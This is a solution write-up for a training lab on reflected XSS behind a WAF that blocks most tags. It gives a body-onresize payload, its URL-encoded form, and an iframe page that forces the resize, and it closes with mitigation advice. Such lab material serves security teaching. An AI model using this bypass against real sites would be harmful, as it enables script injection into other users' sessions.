# Lab 05 — Reflected XSS into HTML context with most tags and attributes blocked

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/most-tags-blocked)

**Entry point:** `GET /?search=` · **Obstacle:** WAF allows very few tags/handlers.

## Solution

1. Probe the WAF: `<script>`, `<img onerror>` are blocked; `<body>` and
   event handlers survive (allow-list).
2. A resize handler on `<body>` works, but the victim must resize the window.
   Force that by embedding the payload in an iframe you can resize:

```
"><body onresize=alert(1)>
```

URL-encoded: `%22%3E%3Cbody%20onresize=alert(1)%3E`

3. On the exploit server, store and deliver this page to the victim:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(1)%3E"
        onload=this.style.width='100px'>
```

4. The victim's browser loads the iframe, its width change triggers
   `onresize`, and the alert fires — lab solved.

## Mitigation

Allow-listing tags is brittle; encode output, use a maintained sanitizer, and
add a CSP that blocks inline handlers.
